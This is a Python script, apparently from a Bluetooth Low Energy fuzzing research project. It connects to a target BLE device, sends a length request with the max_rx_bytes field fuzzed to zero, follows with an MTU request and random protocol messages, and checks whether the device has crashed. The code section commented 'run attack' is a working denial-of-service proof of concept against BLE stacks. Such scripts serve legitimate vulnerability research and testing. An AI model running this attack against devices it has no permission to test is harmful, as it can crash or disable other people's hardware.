import sys
import constant
import random
from colorama import Fore
from fuzzing.FuzzingBLESUL import FuzzedParam, FuzzingBLESUL

args_len = len(sys.argv)

if args_len < 3:
    sys.exit("Too few arguments provided.\nUsage: python3 length_unexpected_state.py 'serial_port' 'advertiser_address', ['pcap_filename']")

serial_port = sys.argv[1]
advertiser_address = sys.argv[2]

if args_len == 4:
    pcap_filename = sys.argv[3]
else:
    pcap_filename = 'unexpected_state_log'

pcap_filename += '.pcap'

ble_sul = FuzzingBLESUL(serial_port, advertiser_address)

# check if initial connection can be established
scan_output = ble_sul.scan_req()
connect_output = ble_sul.connection_request()
ble_sul.termination_indication()
if scan_output == constant.ERROR or connect_output == constant.ERROR:
    print(Fore.RED + "Device cannot be reached!")
    exit()


# run attack
ble_sul.scan_req()
ble_sul.connection_request()
max_rx_bytes = FuzzedParam("max_rx_bytes", 0)
ble_sul.length_request_fuzzed(max_rx_bytes)

# also observable for following outputs/fuzzed params
# ble_sul.length_response_fuzzed(max_rx_bytes)
# max_tx_bytes = FuzzedParam("max_tx_bytes", 0)
# ble_sul.length_request_fuzzed(max_tx_bytes)
# ble_sul.length_response_fuzzed(max_tx_bytes)

# works on mtu and pairing request
#ble_sul.pairing_request()
ble_sul.mtu_request()

alphabet = ['length_req', 'length_rsp',  'feature_rsp', 'version_req', 'mtu_req', 'pairing_req', 'feature_req']

response_received = False

for _ in range(10):
    input = random.choice(alphabet)
    output = ble_sul.step(input)
    if output != "BTLE|BTLE_DATA":
        response_received = True

if not response_received:
    print(Fore.YELLOW + "Device does not respond correspondingly to any requests!")

ble_sul.termination_indication()

# check if device has crashed
crash = True
crash_counter = 0
while crash and crash_counter < constant.CONNECTION_ERROR_ATTEMPTS:
    scan_output = ble_sul.scan_req()
    connect_output = ble_sul.connection_request()
    ble_sul.termination_indication()
    if scan_output != constant.ERROR and connect_output != constant.ERROR:
        crash = False
        break
    crash_counter += 1

if crash:
    print(Fore.RED + "Device might have crashed!")
else:
    print(Fore.GREEN + "No crash detected.")

ble_sul.save_pcap(pcap_filename)

